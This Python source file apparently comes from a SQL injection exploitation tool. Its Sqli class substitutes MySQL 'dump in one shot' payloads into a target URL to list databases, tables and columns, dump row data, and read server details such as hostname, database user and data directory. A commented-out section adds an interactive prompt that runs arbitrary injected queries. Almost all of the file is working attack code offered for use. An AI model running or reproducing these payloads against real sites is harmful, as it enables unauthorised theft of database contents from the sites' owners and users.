import re
import requests
from .Dios import Dios

class Sqli:

    def __init__(self, url):
      self.url           = url
      self.dios          = "(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x) "
      self.show_dbs      = "(SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA)"
      self.dbname = ""
      self.show_tables   = "(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=0x"
      self.show_columns  = "(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+information_schema.COLUMNS+WHERE+TABLE_NAME=0x"
      self.result = ''

    def get_result(self,body):
        sqli_helper = re.search("<sqli-helper>(.*)</sqli-helper>",body, re.DOTALL)

        if ( sqli_helper ):
            return sqli_helper.group(1)
        else:
            raise Exception({
                    "status": False,
                    "message": "Response sql injectin do not match"
                })
    def getResultByTag(self, tag):
        sqli_helper = re.search(f"<{tag}>(.*)</{tag}>",self.result, re.DOTALL)
        return sqli_helper.group(1) if bool(sqli_helper) else "Can't get information"

    def information(self, level=1):
        dios = Dios().get_information()
        response = requests.get(self.url.replace('*',dios))
        if level == 1:
            try:
                sqli_helper = self.get_result(response.text)

                hostname        = re.search("<hostname\(\)>(.*)</hostname\(\)>", sqli_helper, re.DOTALL)
                port            = re.search("<port\(\)>(.*)</port\(\)>", sqli_helper, re.DOTALL)
                user            = re.search("<user\(\)>(.*)</user\(\)>", sqli_helper, re.DOTALL)
                schema          = re.search("<schema\(\)>(.*)</schema\(\)>", sqli_helper, re.DOTALL)
                version         = re.search("<version>(.*)</version>", sqli_helper, re.DOTALL)
                os_version      = re.search("<os_version>(.*)</os_version>", sqli_helper, re.DOTALL)
                mechine_version = re.search("<mechine_version>(.*)</mechine_version>", sqli_helper, re.DOTALL)
                base_dir        = re.search("<base_dir>(.*)</base_dir>", sqli_helper, re.DOTALL)
                data_dir        = re.search("<data_dir>(.*)</data_dir>", sqli_helper, re.DOTALL)
                ssl             = re.search("<ssl>(.*)</ssl>", sqli_helper, re.DOTALL)
                openssl         = re.search("<openssl>(.*)</openssl>", sqli_helper, re.DOTALL)
                symlink         = re.search("<symlink>(.*)</symlink>", sqli_helper, re.DOTALL)
                socket          = re.search("<socket>(.*)</socket>", sqli_helper, re.DOTALL)

                hostname        = hostname.group(1)         if bool(hostname)           else "can't get information"
                port            = port.group(1)             if bool(port)               else "can't get information"
                user            = user.group(1)             if bool(user)               else "can't get information"
                schema          = schema.group(1)           if bool(schema)             else "can't get information"
                version         = version.group(1)          if bool(version)            else "can't get information"
                os_version      = os_version.group(1)       if bool(os_version)         else "can't get information"
                mechine_version = mechine_version.group(1)  if bool(mechine_version)    else "can't get information"
                base_dir        = base_dir.group(1)         if bool(base_dir)           else "can't get information"
                data_dir        = data_dir.group(1)         if bool(data_dir)           else "can't get information"
                ssl             = ssl.group(1)              if bool(ssl)                else "can't get information"
                openssl         = openssl.group(1)          if bool(openssl)            else "can't get information"
                symlink         = symlink.group(1)          if bool(symlink)            else "can't get information"
                socket          = socket.group(1)           if bool(socket)             else "can't get information"
            except Exception as identifier:
                raise Exception(identifier)
 
        return {
                    "hostname": hostname,
                    "port": port,
                    "user": user,
                    "schema": schema,
                    "version": version,
                    "os_version": os_version,
                    "mechine_version": mechine_version,
                    "base_dir": base_dir,
                    "data_dir": data_dir,
                    "ssl": ssl,
                    "openssl": openssl,
                    "symlink": symlink,
                    "socket": socket 
        }
    
    def dump_data(self, tables, columns, level=1):
        if level==1:
            query           = Dios().dump_data(tables, columns, self.dbname)
            query_builder   = Dios().build(query)
            response        = requests.get(self.url.replace('*',query_builder))
            # try:
            result          = self.get_result(response.text)
            
            sqli_array      = result.split('<end/>,')

            realResult              = dict()
            realResult['columns']   = columns
            realResult['data']      = list()
            for sqli in sqli_array:
                self.result = sqli
                result      = list()

                for column in columns:
                    result.append(self.getResultByTag(column))
                realResult['data'].append(result)
            return realResult
            # except Exception as identifier:
            #     return identifier

    def databases(self, level=1):
        if level==1:
            query = Dios().databases()
            query_builder = Dios().build(query)
            r = requests.get(self.url.replace('*', query_builder))
            result = self.get_result(r.text)
            return result.split(',')

    def changeDB(self,dbname):
        database = Dios().strTohex(dbname)
        query = Dios().build(f"(SELECT+GROUP_CONCAT(DISTINCT(table_schema))+FROM+information_schema.columns+WHERE+table_schema=0x{database})")
        try:
            r = requests.get(self.url.replace('*', query))
            res = self.get_result(r.text)

            self.dbname = dbname
            return ([f"Database changed to : {dbname}"], True, self.dbname)

        except Exception:
            return ([f'Unknown Database : {dbname}'], False, "NONE")

    def tables(self):
        r       = requests.get(self.url.replace('*', Dios().build(self.show_tables + Dios().strTohex(self.dbname) + ")")))
        output  = re.search("<sqli-helper>(.*)</sqli-helper>",r.text)

        if output != None:
            title = f"Tables from database {self.dbname}"
            output = output.group(1).split("<br>")
            message = list()
            for table in output:
                message.append(table)
            return (message, title, True)
        else:
            return ([f'Cannot show table from database'],"FAILED", False)

    def columns(self, table_name):
        # table   = 
        try:
            query_builder = Dios().build(Dios().show_columns(table_name, self.dbname))
            r       = requests.get(self.url.replace('*', query_builder))

            result  = re.search("<sqli-helper>(.*)</sqli-helper>",r.text)
            if result != None:
                title = f"Columns from  {table_name} : "
                message = list()
                columns = list()
                result = result.group(1).split(',')
                for column in result:
                    columns.append(column)
                    message.append(column)
                return (message, title, True,columns)
            else:
                return ([f'Cannot show columns from {table_name}'],"FAILED", False)
        except Exception:
            return ([f'Cannot show columns from {table_name}'],"FAILED", False)

    # def command_line(self):
    #     user   = Dios().build(Dios().user())
    #     domain = re.search(r'(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,6}', self.url)[0]

    #     try:
    #         response    = requests.get(self.url.replace('*',user))
    #         sqli_helper = re.search("<sqli-helper>(.*)</sqli-helper>",response.text).group(1)
    #         user        = re.search("<user\(\)>(.*)</user\(\)>", sqli_helper)
    #         user        = user.group(1)
            # cmd         = input("\033[91m┌["+ user.replace('@', '\033[93m@\033[96m') +"\033[91m]~[\033[32m"+ domain +"\033[91m]\n\033[91m└\033[93m#\033[97m ")

            # if cmd == "dump_data":
            #     r           = requests.get(self.url.replace('*', Dios().build(self.dios)))
            #     output      = re.search("<sqli-helper>(.*)</sqli-helper>",r.text).group(1)

            #     if re.search("<br>", output):
            #         br = output.split("<br>")
            #         for result in br:
            #             print(result)
            #         self.command_line()
            # elif cmd == "show dbs":
            #     r           = requests.get(self.url.replace('*', Dios().build(self.show_dbs)))
            #     output      = re.search("<sqli-helper>(.*)</sqli-helper>",r.text).group(1)

            #     print("[\033[92m+\033[97m] Database : ")

            #     output = output.split("<br>")
            #     for db in output:
            #         print(f"└[\033[92m•\033[97m] {db}")
            #     self.command_line()
            # elif re.search("use (.*)", cmd):
            #     dbname  = re.search('use (.*)', cmd).group(1)
            #     r       = requests.get(self.url.replace('*', Dios().build(self.show_tables + Dios().strTohex(dbname) + ")")))
            #     output  = re.search("<sqli-helper>(.*)</sqli-helper>",r.text)

            #     if output != None:
            #         self.dbname = dbname
            #         print(f"\n[\033[92m+\033[97m] Database changed to : {dbname}\n")
            #     else:
            #         print(f'\n[\033[91m-\033[97m] Unknown Database : {dbname}\n')
            #     self.command_line()
            # elif cmd == "show tables":
            #     if not self.dbname:
            #         print("\n[\033[91m-\033[97m] No database selected!\n")
            #     else:
            #         r       = requests.get(self.url.replace('*', Dios().build(self.show_tables + Dios().strTohex(self.dbname) + ")")))
            #         output  = re.search("<sqli-helper>(.*)</sqli-helper>",r.text)

            #         if output != None:
            #             print(f"[\033[92m+\033[97m] Tables from database {self.dbname} : ")
            #             output = output.group(1).split("<br>")
            #             for table in output:
            #                 print(f"└[\033[92m•\033[97m] {table}")
            #         else:
            #             print(f'\n[\033[91m-\033[97m] Cannot show table from database {self.dbname}\n')
            #     self.command_line()
            # elif re.search("show columns (.*)", cmd):
            #     table   = re.search('show columns (.*)', cmd).group(1)
            #     r       = requests.get(self.url.replace('*', Dios().build(self.show_columns + Dios().strTohex(table) + ")")))
            #     output  = re.search("<sqli-helper>(.*)</sqli-helper>",r.text)
            #     if output != None:
            #         print(f"[\033[92m+\033[97m] Columns from table {table} : ")
            #         output = output.group(1).split('<br>')
            #         for column in output:
            #             print(f"└[\033[92m•\033[97m] {column}")
            #     self.command_line()
            # else:
            #     r           = requests.get(self.url.replace('*', Dios().build(cmd)))
            #     output      = re.search("<sqli-helper>(.*)</sqli-helper>",r.text).group(1)
            #     print(f"\n[+] Output : {output}\n")
            # self.command_line()
    #     except Exception:
    #         print("\n[!] Syntax Error!\n")
    #         self.command_line()